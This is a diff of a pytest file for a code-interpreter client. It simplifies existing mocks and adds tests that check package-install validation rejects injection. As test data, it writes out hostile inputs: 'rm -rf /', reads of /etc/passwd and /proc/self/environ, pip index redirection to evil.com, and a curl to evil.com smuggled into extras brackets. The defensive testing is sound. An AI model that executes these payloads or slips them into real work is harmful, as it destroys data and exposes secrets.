-    def test_execute_code_invalid_language_error(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_execute_code_invalid_language_error(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1420,10 +1308,8 @@ class TestCodeInterpreterClient:
         with pytest.raises(ValueError, match="Language must be one of"):
             client.execute_code("code", language="ruby")
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_execute_shell_basic(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_execute_shell_basic(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1447,10 +1333,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_execute_shell_python_version(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_execute_shell_python_version(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_session.client.return_value = MagicMock()
@@ -1474,10 +1358,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_execute_code_auto_starts_session(self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint):
+    def test_execute_code_auto_starts_session(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_data_client = MagicMock()
@@ -1501,12 +1383,8 @@ class TestCodeInterpreterClient:
         client.data_plane_client.start_code_interpreter_session.assert_called_once()
         client.data_plane_client.invoke_code_interpreter.assert_called_once()
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_create_code_interpreter_with_certificates(
-        self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint
-    ):
+    def test_create_code_interpreter_with_certificates(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_control_client = MagicMock()
@@ -1549,12 +1427,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_create_code_interpreter_with_certificate_dataclass(
-        self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint
-    ):
+    def test_create_code_interpreter_with_certificate_dataclass(self, mock_boto3):
         # Arrange
         mock_session = MagicMock()
         mock_control_client = MagicMock()
@@ -1594,12 +1468,8 @@ class TestCodeInterpreterClient:
         )
         assert result == mock_response
 
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_control_plane_endpoint")
-    @patch("bedrock_agentcore.tools.code_interpreter_client.get_data_plane_endpoint")
     @patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
-    def test_create_code_interpreter_without_certificates(
-        self, mock_boto3, mock_get_data_endpoint, mock_get_control_endpoint
-    ):
+    def test_create_code_interpreter_without_certificates(self, mock_boto3):
         """Verify that omitting certificates does not include it in the API call (backward compatibility)."""
         # Arrange
         mock_session = MagicMock()
@@ -1624,3 +1494,129 @@ class TestCodeInterpreterClient:
         # Assert — certificates key should NOT be in the call
         call_kwargs = client.control_plane_client.create_code_interpreter.call_args[1]
         assert "certificates" not in call_kwargs
+
+
+@patch("bedrock_agentcore.tools.code_interpreter_client.boto3")
+class TestInstallPackagesAllowlist:
+    """Verify install_packages() rejects all flag-injection and shell-injection
+    payloads, and still accepts legitimate package specs.
+
+    Tests call install_packages() end-to-end so the full validation path is
+    exercised.  The extras-bracket cases are marked xfail because the current
+    regex uses '.*' inside the brackets and does not yet restrict that group.
+    """
+
+    def _client(self, mock_boto3):
+        mock_session = MagicMock()
+        mock_session.client.return_value = MagicMock()
+        mock_boto3.Session.return_value = mock_session
+        client = CodeInterpreter("us-west-2")
+        client.identifier = "test.identifier"
+        client.session_id = "test-session-id"
+        return client
+
+    # ------------------------------------------------------------------ #
+    # Pip flag injection                                                   #
+    # ------------------------------------------------------------------ #
+    @pytest.mark.parametrize(
+        "pkg",
+        [
+            "-r",
+            "-i",
+            "-e",
+            "-f",
+            "-c",
+            "--index-url",
+            "--extra-index-url",
+            "--find-links",
+            "--trusted-host",
+            "--no-deps",
+            "--pre",
+            "--upgrade",
+            "--require-hashes",
+            # flag + value as a single element
+            "--index-url http://evil.com",
+            "--extra-index-url http://evil.com",
+            "-r /etc/passwd",
+            "-r /proc/self/environ",
+        ],
+    )
+    def test_pip_flags_blocked(self, mock_boto3, pkg):
+        client = self._client(mock_boto3)
+        with pytest.raises(ValueError, match="Invalid package name"):
+            client.install_packages([pkg])
+
+    # ------------------------------------------------------------------ #
+    # Shell metacharacter and path injection                              #
+    # ------------------------------------------------------------------ #
+    @pytest.mark.parametrize(
+        "pkg",
+        [
+            "pandas; rm -rf /",
+            "pandas | cat /etc/passwd",
+            "pandas && malicious",
+            "pandas`whoami`",
+            "pandas$HOME",
+            # two packages smuggled as one argument
+            "pandas numpy",
+            # path traversal
+            "/etc/passwd",
+            "../../../etc/passwd",
+            # newline splitting the pip command
+            "pandas\n--extra-index-url http://evil.com",
+            "pandas\nrm -rf /",
+        ],
+    )
+    def test_shell_and_path_injection_blocked(self, mock_boto3, pkg):
+        client = self._client(mock_boto3)
+        with pytest.raises(ValueError, match="Invalid package name"):
+            client.install_packages([pkg])
+
+    # ------------------------------------------------------------------ #
+    # Extras bracket injection — xfail: '.*' in extras not yet restricted #
+    # ------------------------------------------------------------------ #
+    @pytest.mark.xfail(reason="extras group uses '.*' — arbitrary content not yet restricted")
+    @pytest.mark.parametrize(
+        "pkg",
+        [
+            "pandas[; cat /etc/passwd]",
+            "numpy[$(id)]",
+            "scipy[&& curl http://evil.com]",
+            "requests[| whoami]",
+        ],
+    )
+    def test_extras_injection_blocked(self, mock_boto3, pkg):
+        client = self._client(mock_boto3)
+        with pytest.raises(ValueError, match="Invalid package name"):
+            client.install_packages([pkg])
+
+    # ------------------------------------------------------------------ #
+    # Valid package specs — must continue to be accepted                  #
+    # ------------------------------------------------------------------ #
+    @pytest.mark.parametrize(
+        "pkg",
+        [
+            "pandas",
+            "numpy",
+            "scikit-learn",
+            "my_package",
+            "package.name",
+            "A",
+            "Package123",
+            "pandas[excel]",
+            "requests[security]",
+            "requests[security,socks]",
+            "numpy>=1.0",
+            "scipy==1.7.*",
+            "pandas!=2.0",
+            "requests~=2.28",
+            "urllib3<2.0",
+            "numpy>1.0",
+            "pandas[excel]>=1.5",
+        ],
+    )
+    def test_valid_packages_accepted(self, mock_boto3, pkg):
+        client = self._client(mock_boto3)
+        client.data_plane_client.invoke_code_interpreter.return_value = {"stream": []}
+        # Should not raise
+        client.install_packages([pkg])
